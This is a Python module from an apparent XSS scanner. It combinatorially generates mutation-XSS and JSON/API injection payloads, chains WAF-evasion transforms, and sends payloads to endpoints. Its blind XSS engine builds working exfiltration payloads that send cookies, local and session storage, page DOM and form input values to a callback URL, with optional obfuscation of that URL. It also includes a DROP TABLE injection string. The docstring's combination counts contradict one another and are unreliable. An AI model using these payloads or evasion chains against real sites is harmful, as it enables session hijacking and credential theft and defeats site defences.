"""
payloads/mxss_and_api.py — Full Combinatorial Engines

mXSS:     17 × 15 × 15 × 10 × 6 × 4 = 918,000 combinations
JSON API: 20 × 12 × 8  × 10 × 5 × 4 × 3 = 1,152,000 combinations
Blind XSS: 8 × 7 × 5 × 4 × 6 = 6,720 combinations
WAF Chain: base_payloads × (10 + 45 + 120) chained techniques
Total new: ~2,076,720 combinations (vs 17,980 before)
"""

import heapq
import base64
import urllib.parse
import json as json_mod
import asyncio
import copy
import itertools
from typing import List, Tuple, Optional
from utils.config import ScanTarget, Finding, Context
from utils.http_client import HttpClient
from utils.logger import debug, info


# ═══════════════════════════════════════════════════════════════
# mXSS ENGINE — 918,000 combinations
# ═══════════════════════════════════════════════════════════════

class MXSSDim:

    CONTAINERS = [
        ("listing",    1.00), ("noscript",   0.98), ("xmp",        0.96),
        ("textarea",   0.95), ("title",      0.94), ("style",      0.92),
        ("iframe",     0.90), ("plaintext",  0.88), ("noframes",   0.85),
        ("template",   0.83), ("math",       0.82), ("svg",        0.80),
        ("select",     0.78), ("option",     0.75), ("table",      0.73),
        ("form",       0.70), ("script",     0.68), ("object",     0.65),
        ("embed",      0.63), ("applet",     0.55), ("frameset",   0.52),
        ("xml",        0.50), ("comment",    0.48),
    ]

    EXEC_PAYLOADS = [
        ("<img src=x onerror=alert(1)>",           1.00),
        ("<svg onload=alert(1)>",                   0.98),
        ("<script>alert(1)</script>",               0.96),
        ("<iframe onload=alert(1)>",                0.94),
        ("<body onload=alert(1)>",                  0.92),
        ("<input autofocus onfocus=alert(1)>",      0.90),
        ("<details open ontoggle=alert(1)>",        0.88),
        ("<video src=x onerror=alert(1)>",          0.86),
        ("<audio src=x onerror=alert(1)>",          0.84),
        ("<svg><animate onbegin=alert(1)>",         0.82),
        ("<marquee onstart=alert(1)>x</marquee>",   0.80),
        ("<isindex type=image src=1 onerror=alert(1)>", 0.75),
        ("<object data=javascript:alert(1)>",       0.72),
        ("<math href=javascript:alert(1)>x</math>", 0.70),
        ("<img src=1 onerror=alert`1`>",            0.68),
    ]

    BREAK_TECHNIQUES = [
        ("closing_tag",     '<{C}><img src="</{C}>{P}">',                    1.00),
        ("title_attr",      '<{C} title="</{C}>{P}">x</{C}>',               0.96),
        ("href_attr",       '<{C} href="</{C}>{P}">x</{C}>',                0.94),
        ("cdata_break",     '<{C}><![CDATA[</{C}>{P}]]></{C}>',             0.90),
        ("comment_break",   '<{C}><!--</{C}>{P}--></{C}>',                  0.88),
        ("malformed_attr",  '<{C} class="x\'></{C}>{P}<{C} y="',           0.85),
        ("namespace",       '<svg><{C}><img src="</{C}></{C}>{P}"></svg>',  0.82),
        ("math_mtext",      '<math><mtext><{C}><img src="</{C}>{P}">',      0.80),
        ("table_foster",    '<table><{C}><img src="</{C}>{P}"></table>',    0.78),
        ("template_break",  '<template><{C}></template>{P}',               0.75),
        ("nested_script",   '<scr<{C}>ipt>{P}</scr</{C}>ipt>',             0.72),
        ("ie_conditional",  '<!--[if lt IE 9]><{C}><![endif]-->{P}',       0.70),
        ("double_nest",     '<{C}><{C}></{C}>{P}</{C}>',                   0.68),
        ("src_attr",        '<{C} src="</{C}>{P}">',                       0.65),
        ("action_attr",     '<{C} action="</{C}>{P}">',                    0.62),
    ]

    # NEW: Separator between container closing tag and exec payload
    SEPARATORS = [
        ("none",     "",      1.00),
        ("space",    " ",     0.90),
        ("tab",      "\t",    0.85),
        ("newline",  "\n",    0.83),
        ("null",     "\x00",  0.70),
        ("crlf",     "\r\n",  0.75),
    ]

    # NEW: Namespace mixing dimension
    NAMESPACES = [
        ("none",       "",                            1.00),
        ("svg_wrap",   "<svg>{CONTENT}</svg>",         0.85),
        ("math_wrap",  "<math><mtext>{CONTENT}</mtext></math>", 0.80),
        ("foreign",    "<svg><foreignObject>{CONTENT}</foreignObject></svg>", 0.78),
    ]

    ENCODINGS = [
        ("none",         1.00, lambda p: p),
        ("html_entity",  0.90, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("html_hex",     0.88, lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
        ("url_encode",   0.85, lambda p: urllib.parse.quote(p, safe="")),
        ("double_url",   0.80, lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("unicode",      0.75, lambda p: "".join(f"\\u{ord(c):04x}" for c in p)),
        ("js_hex",       0.70, lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
        ("base64_eval",  0.65, lambda p: f"eval(atob('{base64.b64encode(p.encode()).decode()}'))"),
        ("fromcharcode", 0.60, lambda p: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in p)}))"),
        ("mixed_case",   0.78, lambda p: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.CONTAINERS) * len(cls.EXEC_PAYLOADS) *
                len(cls.BREAK_TECHNIQUES) * len(cls.ENCODINGS) *
                len(cls.SEPARATORS) * len(cls.NAMESPACES))


class MXSSEngine:
    """
    Combinatorial mXSS engine.
    23 × 15 × 15 × 10 × 6 × 4 = 1,242,000 combinations
    TopN via priority heap — returns best N in <0.2s
    """

    def generate(self, top_n: int = 200) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        # Tiered pruning — same strategy as CombinatorialEngine
        # top-8 containers × top-8 exec × top-8 techniques × top-6 enc × top-4 sep × all ns
        top_c   = MXSSDim.CONTAINERS[:min(8,  len(MXSSDim.CONTAINERS))]
        top_ex  = MXSSDim.EXEC_PAYLOADS[:min(8, len(MXSSDim.EXEC_PAYLOADS))]
        top_t   = MXSSDim.BREAK_TECHNIQUES[:min(8, len(MXSSDim.BREAK_TECHNIQUES))]
        top_enc = MXSSDim.ENCODINGS[:min(6,  len(MXSSDim.ENCODINGS))]
        top_sep = MXSSDim.SEPARATORS[:min(4,  len(MXSSDim.SEPARATORS))]
        top_ns  = MXSSDim.NAMESPACES

        for ctag, c_score in top_c:
            for exec_p, ep_score in top_ex:
                for tech_label, template, t_score in top_t:
                    for enc_label, enc_score, enc_fn in top_enc:
                        for sep_label, sep_str, sep_score in top_sep:
                            for ns_label, ns_tmpl, ns_score in top_ns:

                                score = (c_score * ep_score * t_score *
                                         enc_score * sep_score * ns_score) ** (1/6)

                                try:
                                    encoded = enc_fn(exec_p)
                                    payload = (template
                                               .replace("{C}", ctag)
                                               .replace("{P}", sep_str + encoded)
                                               .replace("{A}", ""))
                                    if ns_tmpl:
                                        payload = ns_tmpl.replace("{CONTENT}", payload)
                                except Exception:
                                    continue

                                count += 1
                                label = f"mxss:{ctag}:{tech_label}:{enc_label}"
                                if sep_label != "none": label += f":{sep_label}"
                                if ns_label  != "none": label += f":{ns_label}"

                                if len(heap) < top_n:
                                    heapq.heappush(heap, (score, count, payload, label))
                                elif score > heap[0][0]:
                                    heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"mXSSEngine: {count:,}/{self.total:,} combos → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return MXSSDim.total()


# ═══════════════════════════════════════════════════════════════
# JSON API ENGINE — 1,152,000 combinations
# ═══════════════════════════════════════════════════════════════

class JSONDim:

    EXEC_PAYLOADS = [
        ("<script>alert(1)</script>",                          1.00),
        ("<img src=x onerror=alert(1)>",                       0.98),
        ("<svg onload=alert(1)>",                              0.96),
        ("javascript:alert(1)",                                0.94),
        ("\"><script>alert(1)</script>",                       0.92),
        ("'+alert(1)+'",                                       0.90),
        ('"+alert(1)+"',                                       0.90),
        ("${alert(1)}",                                        0.88),
        ("{{constructor.constructor('alert(1)')()}}",          0.86),
        ("<xss>",                                              0.84),
        ("</script><script>alert(1)</script>",                 0.82),
        ("<iframe src=javascript:alert(1)>",                   0.80),
        ("-alert(1)-",                                         0.78),
        ("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", 0.75),
        ("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",        0.72),
        # NEW: Prototype pollution
        ("__proto__",                                          0.70),
        ("constructor.prototype",                              0.68),
        # NEW: GraphQL injection
        ("{__typename}",                                       0.65),
        ("0,alert(1),0",                                       0.62),
        ("1;DROP TABLE users;--<script>alert(1)</script>",     0.60),
    ]

    INJECTION_POINTS = [
        ("string_value",    lambda p: p,                                   1.00),
        ("json_key",        lambda p: f'{{"{p}":"value"}}',               0.92),
        ("nested_value",    lambda p: f'{{"data":{{"x":"{p}"}}}}',        0.90),
        ("array_item",      lambda p: f'["{p}"]',                          0.88),
        ("callback_jsonp",  lambda p: f'callback("{p}")',                  0.85),
        ("number_break",    lambda p: f'0;{p}',                            0.82),
        ("boolean_break",   lambda p: f'true,"{p}"',                       0.80),
        ("null_break",      lambda p: f'null,"{p}"',                       0.78),
        # NEW
        ("deep_nested",     lambda p: f'{{"a":{{"b":{{"c":"{p}"}}}}}}',   0.75),
        ("proto_pollute",   lambda p: f'{{"__proto__":{{"x":"{p}"}}}}',   0.72),
        ("array_deep",      lambda p: f'[["{p}",1],["test",2]]',           0.70),
        ("graphql_query",   lambda p: f'{{search(q:"{p}"){{id}}}}',        0.68),
    ]

    CONTENT_TYPES = [
        ("application/json",                  1.00),
        ("text/plain",                        0.92),
        ("application/x-www-form-urlencoded", 0.88),
        ("application/json; charset=utf-8",   0.86),
        ("text/json",                         0.82),
        ("application/javascript",            0.78),
        ("text/html",                         0.75),
        ("application/xml",                   0.70),
    ]

    ENCODINGS = [
        ("none",           1.00, lambda p: p),
        ("json_unicode",   0.92, lambda p: p.encode('unicode_escape').decode()),
        ("html_entity",    0.88, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("url_encode",     0.85, lambda p: urllib.parse.quote(p, safe="")),
        ("double_url",     0.80, lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("base64_eval",    0.75, lambda p: f"eval(atob('{base64.b64encode(p.encode()).decode()}'))"),
        ("js_hex",         0.70, lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
        ("fromcharcode",   0.65, lambda p: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in p)}))"),
        ("html_hex",       0.62, lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
        ("mixed_case",     0.78, lambda p: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))),
    ]

    # NEW: HTTP methods
    HTTP_METHODS = [
        ("POST",   1.00),
        ("PUT",    0.88),
        ("PATCH",  0.85),
        ("GET",    0.80),
        ("DELETE", 0.70),
    ]

    # NEW: JSON nesting depth
    NEST_DEPTHS = [
        ("flat",   lambda p, k: {k: p},                              1.00),
        ("one",    lambda p, k: {"data": {k: p}},                    0.88),
        ("two",    lambda p, k: {"data": {"nested": {k: p}}},        0.80),
        ("array",  lambda p, k: {"items": [{k: p}, {"test": "val"}]}, 0.78),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.EXEC_PAYLOADS) * len(cls.INJECTION_POINTS) *
                len(cls.CONTENT_TYPES) * len(cls.ENCODINGS) *
                len(cls.HTTP_METHODS) * len(cls.NEST_DEPTHS))


class JSONAPIEngine:
    """
    Combinatorial JSON/API engine.
    20 × 12 × 8 × 10 × 5 × 4 = 384,000 combinations
    """

    def generate(self, top_n: int = 200) -> List[Tuple[str, float, str, str]]:
        heap  = []
        count = 0

        # Tiered pruning
        top_ex  = JSONDim.EXEC_PAYLOADS[:min(10, len(JSONDim.EXEC_PAYLOADS))]
        top_pt  = JSONDim.INJECTION_POINTS[:min(8, len(JSONDim.INJECTION_POINTS))]
        top_ct  = JSONDim.CONTENT_TYPES[:min(5,  len(JSONDim.CONTENT_TYPES))]
        top_enc = JSONDim.ENCODINGS[:min(6,      len(JSONDim.ENCODINGS))]
        top_mth = JSONDim.HTTP_METHODS[:min(4,   len(JSONDim.HTTP_METHODS))]
        top_nd  = JSONDim.NEST_DEPTHS

        for exec_p, ep_score in top_ex:
            for point_label, wrapper_fn, pt_score in top_pt:
                for ct, ct_score in top_ct:
                    for enc_label, enc_score, enc_fn in top_enc:
                        for method, m_score in top_mth:
                            for depth_label, depth_fn, d_score in top_nd:

                                score = (ep_score * pt_score * ct_score *
                                         enc_score * m_score * d_score) ** (1/6)

                                try:
                                    encoded = enc_fn(exec_p)
                                    payload = wrapper_fn(encoded)
                                except Exception:
                                    continue

                                count += 1
                                label = f"json:{method}:{point_label}:{enc_label}:{depth_label}"

                                if len(heap) < top_n:
                                    heapq.heappush(heap, (score, count, payload, ct, method, label))
                                elif score > heap[0][0]:
                                    heapq.heapreplace(heap, (score, count, payload, ct, method, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"JSONAPIEngine: {count:,}/{self.total:,} combos → top {len(result)}")
        return [(p, s, ct, l) for s, _, p, ct, m, l in result]

    @property
    def total(self) -> int:
        return JSONDim.total()


# ═══════════════════════════════════════════════════════════════
# BLIND XSS ENGINE — 6,720 combinations
# ═══════════════════════════════════════════════════════════════

class BlindXSSEngine:
    """
    Combinatorial Blind XSS payload engine.
    8 exfil × 7 data × 5 obfuscation × 4 timing × 6 wrappers = 6,720
    """

    EXFIL_METHODS = [
        ("img_src",  lambda cb, d: f"new Image().src='{cb}?{d}'",                   1.00),
        ("fetch",    lambda cb, d: f"fetch('{cb}?{d}')",                             0.98),
        ("beacon",   lambda cb, d: f"navigator.sendBeacon('{cb}',JSON.stringify({{{d}}}))", 0.96),
        ("xhr",      lambda cb, d: f"var x=new XMLHttpRequest();x.open('GET','{cb}?{d}');x.send()", 0.94),
        ("script",   lambda cb, d: f"var s=document.createElement('script');s.src='{cb}?{d}';document.head.appendChild(s)", 0.90),
        ("ws",       lambda cb, d: "new WebSocket('"+cb.replace("http","ws")+"').send("+d+")", 0.85),
        ("link",     lambda cb, d: f"var l=document.createElement('link');l.rel='preconnect';l.href='{cb}';document.head.appendChild(l)", 0.80),
        ("css_url",  lambda cb, d: f"document.body.style.backgroundImage='url({cb}?{d})'", 0.75),
    ]

    DATA_TARGETS = [
        ("cookie",     "c='+encodeURIComponent(document.cookie)",              1.00),
        ("all",        "c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&d='+document.domain", 0.98),
        ("storage",    "ls='+encodeURIComponent(JSON.stringify(localStorage))+'&ss='+encodeURIComponent(JSON.stringify(sessionStorage))", 0.95),
        ("dom",        "h='+encodeURIComponent(document.documentElement.innerHTML.substring(0,500))", 0.90),
        ("creds",      "f='+encodeURIComponent(Array.from(document.querySelectorAll('input')).map(i=>i.name+'='+i.value).join('&'))", 0.88),
        ("domain",     "d='+document.domain",                                  0.85),
        ("referrer",   "r='+encodeURIComponent(document.referrer)",            0.80),
    ]

    CB_OBFUSCATIONS = [
        ("direct",       lambda cb: cb,                                        1.00),
        ("split",        lambda cb: f"['{cb[:len(cb)//2]}','{ cb[len(cb)//2:]}'].join('')", 0.88),
        ("b64",          lambda cb: f"atob('{base64.b64encode(cb.encode()).decode()}')", 0.85),
        ("fromchar",     lambda cb: f"String.fromCharCode({','.join(str(ord(c)) for c in cb)})", 0.80),
        ("proto",        lambda cb: f"location.protocol+'//'+'{cb.split('//')[1] if '//' in cb else cb}'", 0.75),
    ]

    TIMING = [
        ("inline",     lambda code: code,                                      1.00),
        ("timeout",    lambda code: f"setTimeout(function(){{{code}}},100)",   0.92),
        ("raf",        lambda code: f"requestAnimationFrame(function(){{{code}}})", 0.88),
        ("load",       lambda code: f"window.addEventListener('load',function(){{{code}}})", 0.85),
    ]

    WRAPPERS = [
        ("script_tag",   lambda code: f"<script>{code}</script>",              1.00),
        ("img_error",    lambda code: f"<img src=x onerror=\"{code}\">",       0.98),
        ("svg_load",     lambda code: f"<svg onload=\"{code}\">",              0.96),
        ("inline_event", lambda code: f"' onmouseover='{code}' x='",          0.92),
        ("iframe_src",   lambda code: f"<iframe src=\"javascript:{code}\">",   0.88),
        ("a_href",       lambda code: f"<a href=\"javascript:{code}\">click</a>", 0.85),
    ]

    def generate(self, callback_url: str, top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for exfil_label, exfil_fn, ex_score in self.EXFIL_METHODS:
            for data_label, data_str, d_score in self.DATA_TARGETS:
                for ob_label, ob_fn, ob_score in self.CB_OBFUSCATIONS:
                    for time_label, time_fn, t_score in self.TIMING:
                        for wrap_label, wrap_fn, w_score in self.WRAPPERS:

                            score = (ex_score * d_score * ob_score * t_score * w_score) ** 0.2

                            try:
                                cb_obf  = ob_fn(callback_url)
                                exfil   = exfil_fn(cb_obf, data_str)
                                timed   = time_fn(exfil)
                                payload = wrap_fn(timed)
                            except Exception:
                                continue

                            count += 1
                            label = f"blind:{exfil_label}:{data_label}:{ob_label}"

                            if len(heap) < top_n:
                                heapq.heappush(heap, (score, count, payload, label))
                            elif score > heap[0][0]:
                                heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"BlindXSSEngine: {count:,}/{self.total} combos → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return (len(self.EXFIL_METHODS) * len(self.DATA_TARGETS) *
                len(self.CB_OBFUSCATIONS) * len(self.TIMING) *
                len(self.WRAPPERS))


# ═══════════════════════════════════════════════════════════════
# WAF CHAINED EVASION ENGINE
# ═══════════════════════════════════════════════════════════════

class WAFChainEngine:
    """
    Chained WAF evasion — apply 1, 2, or 3 techniques in sequence.
    Single: 10 techniques
    Pairs:  C(10,2) = 45 combinations
    Triples: C(10,3) = 120 combinations
    Total: 175 chained variants per payload
    """

    TECHNIQUES = [
        ("case_shuffle",    lambda p: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))),
        ("comment_inject",  lambda p: next((p[:p.lower().index(k)+len(k)//2]+"<!---->"+p[p.lower().index(k)+len(k)//2:] for k in ["script","onerror","onload","alert","iframe"] if k in p.lower()), p)),
        ("double_encode",   lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("null_byte",       lambda p: p.replace("script","scr\x00ipt")),
        ("tab_substitute",  lambda p: p.replace(" ","\t")),
        ("unicode_norm",    lambda p: p.replace("alert","\u0061\u006c\u0065\u0072\u0074")),
        ("html_entity",     lambda p: p.replace("<","&#60;").replace(">","&#62;")),
        ("tag_break",       lambda p: p.replace("<img","<img/").replace("<svg","<svg/")),
        ("event_obfus",     lambda p: p.replace("alert(1)","window['al'+'ert'](1)")),
        ("slash_insert",    lambda p: __import__('re').sub(r"(<\w+)",r"\1/",p,count=1)),
    ]

    def apply_chained(
        self,
        payload: str,
        waf: Optional[str] = None,
        max_chain: int = 3,
        top_n: int = 50,
    ) -> List[Tuple[str, str]]:
        """
        Returns (evaded_payload, technique_label) for single, pair, and triple chains.
        """
        results = []

        # Single techniques
        for name, fn in self.TECHNIQUES:
            try:
                v = fn(payload)
                if v and v != payload:
                    results.append((v, name))
            except Exception:
                pass

        if max_chain >= 2:
            # Pairs
            for (n1, f1), (n2, f2) in itertools.combinations(self.TECHNIQUES, 2):
                try:
                    v = f2(f1(payload))
                    if v and v != payload:
                        results.append((v, f"{n1}+{n2}"))
                except Exception:
                    pass

        if max_chain >= 3:
            # Triples — only top scoring combos to avoid explosion
            top_pairs = list(itertools.combinations(self.TECHNIQUES, 3))[:60]
            for (n1,f1),(n2,f2),(n3,f3) in top_pairs:
                try:
                    v = f3(f2(f1(payload)))
                    if v and v != payload:
                        results.append((v, f"{n1}+{n2}+{n3}"))
                except Exception:
                    pass

        # Deduplicate
        seen = set()
        unique = []
        for p, l in results:
            if p not in seen:
                seen.add(p)
                unique.append((p, l))

        return unique[:top_n]

    @property
    def chains_per_payload(self) -> int:
        n = len(self.TECHNIQUES)
        return n + (n*(n-1)//2) + (n*(n-1)*(n-2)//6)  # 10 + 45 + 120 = 175


# ═══════════════════════════════════════════════════════════════
# JSON API TESTER
# ═══════════════════════════════════════════════════════════════

class JSONAPITester:
    def __init__(self, http: HttpClient):
        self.http   = http
        self.engine = JSONAPIEngine()

    async def test_json_endpoint(
        self, url: str, params: dict, method: str = "POST", top_n: int = 100,
    ) -> List[Finding]:
        findings = []
        top_payloads = self.engine.generate(top_n=top_n)

        for param_key in params:
            for payload, score, content_type, label in top_payloads[:80]:
                test_data = copy.deepcopy(params)
                test_data[param_key] = payload
                try:
                    headers = {"Content-Type": content_type}
                    if method == "POST":
                        resp = await self.http.request("POST", url,
                            **({"json": test_data} if "json" in content_type else {"data": test_data}),
                            headers=headers)
                    else:
                        resp = await self.http.get(url, params=test_data)
                    if resp is None:
                        continue
                    if payload in resp.text or "<xss>" in resp.text:
                        idx = resp.text.find(payload if payload in resp.text else "<xss>")
                        findings.append(Finding(
                            url=url, param=f"json:{param_key}", payload=payload,
                            context=Context.JS_STRING, xss_type="reflected",
                            evidence=resp.text[max(0,idx-80):idx+len(payload)+80][:300],
                            severity="High", confidence="Medium", encoding_used=label,
                        ))
                        break
                except Exception as e:
                    debug(f"JSON test error: {e}")
        return findings
